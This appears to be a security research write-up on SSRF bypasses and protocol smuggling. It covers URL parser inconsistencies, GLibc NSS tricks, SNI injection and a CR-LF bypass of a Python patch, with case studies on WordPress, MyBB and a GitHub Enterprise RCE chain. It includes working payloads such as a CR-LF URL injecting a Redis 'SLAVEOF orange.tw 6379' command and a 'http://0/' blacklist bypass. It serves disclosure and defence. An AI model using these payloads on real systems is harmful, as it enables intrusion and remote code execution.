### Introduction

Some library implementations decode the URL twice, which can lead to security vulnerabilities. For example, the URL `http://127.0.0.1%2509foo.google.com` can be decoded in a way that exploits GLibc NSS features for protocol smuggling.

### Exploiting GLibc NSS Features on Protocol Smuggling

#### HTTP Protocol 1.1 and Host Header

HTTP protocol 1.1 requires a `Host` header. This can be demonstrated using `curl`:

```bash
$ curl -vvv http://I-am-a-very-very-weird-domain.com
>> GET / HTTP/1.1
>> Host: I-am-a-very-very-weird-domain.com
>> User-Agent: curl/7.53.1
>> Accept: */*
```

#### Example of Protocol Smuggling

Using `nc` (Netcat) to demonstrate a protocol smuggling attack:

```bash
$ nc -vvlp 6379
>> GET / HTTP/1.1
>> Host: 127.0.0.1
>> SLAVEOF orange.tw 6379
>> :6379
>> Connection: close
```

Another example with SSL:

```bash
$ nc -vvlp 443
>> ..=53210...EDCB..
>> .....5'%"127.0.0.1
>> SET foo 0 60 5
```

### SNI Injection

SNI (Server Name Indication) injection can be used to embed a hostname in the SSL Client Hello message. This can be achieved by simply replacing `HTTP` with `HTTPS`.

### Python CVE-2016-5699 Patch Bypass

The patch for Python CVE-2016-5699, which addresses CR-LF injection in `HTTPConnection.putheader()`, can be bypassed with a leading space:

```python
>>> import urllib
>>> url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
>>> urllib.urlopen(url)
```

### Case Studies

#### Abusing URL Parsers

**WordPress**
1. Paid significant attention to SSRF protections.
2. Three distinct ways to bypass these protections were found.
3. Bugs reported since February 25, 2017, remain unpatched.
4. For responsible disclosure, MyBB is used as a case study.

**Main Concept**
Finding different behaviors among URL parsers, DNS checkers, and URL requesters.

| Component          | WordPress   | vBulletin  | MyBB       |
|--------------------|-------------|------------|------------|
| URL Parser         | `parse_url()` | `parse_url()` | `parse_url()` |
| DNS Checker        | `gethostbyname()` | None      | `gethostbynamel()` |
| URL Requester      | *cURL*      | *cURL*     | *cURL*     |

**SSRF-Bypass Techniques**

1. **Time-of-check to Time-of-use Problem**
   - The URL is parsed and checked, but the DNS resolution and actual request can differ, leading to SSRF.

2. **Inconsistency between DNS Checker and URL Requester**
   - No IDNA converter in `gethostbynamel()`, but cURL has one, leading to SSRF.

3. **Inconsistency between URL Parser and URL Requester**
   - Fixed in PHP 7.0.13 and cURL 7.54, but still exploitable in older versions.

#### Protocol Smuggling

**GitHub Enterprise**
- A standalone version of GitHub written in Ruby on Rails with obfuscated code.
- Remote Code Execution (RCE) by chaining four vulnerabilities:
  1. **SSRF-Bypass on Webhooks**
     - Fetched URLs using `faraday` and blacklisted hosts using `faraday-restrict-ip-addresses`.
     - Bypassed with a zero: `http://0/`.
  2. **SSRF in Internal Graphite Service**
     - Graphite service bound to `127.0.0.1:8000` and vulnerable to SSRF.
  3. **CR-LF Injection in Graphite**
     - Implemented with `httplib.HTTPConnection` and susceptible to CR-LF injection.
  4. **Unsafe Marshal in Memcached Gem**
     - All Ruby objects stored in cache are Marshal-ed, leading to RCE.

### Mitigations

- **Application Layer**: Use only IP and hostname, do not reuse input URLs.
- **Network Layer**: Use firewalls or network policies to block intranet traffic.

### Projects

- **SafeCurl** by @fin1te, advocated by @JordanMilne.

### Summary

- New attack surfaces on SSRF-bypass include URL parsing issues and abusing IDNA standards.
- New attack vectors on protocol smuggling leverage Linux Glibc NSS features and NodeJS Unicode failures.
- Case studies highlight the importance of consistent URL handling and proper security measures.

### Acknowledgements

- Invalid URL parsing with `#` by @bagder.
- URL Interop by @bagder.
- Shibuya.XSS #8 by @mala.
- SSRF Bible by @Wallarm.
- Special thanks to Allen Own, Birdman Chiu, Henry Huang, and others.

### References

- Meme Websites and cat acknowledgements.
- Thanks to PI:EMAIL and @orange_8361.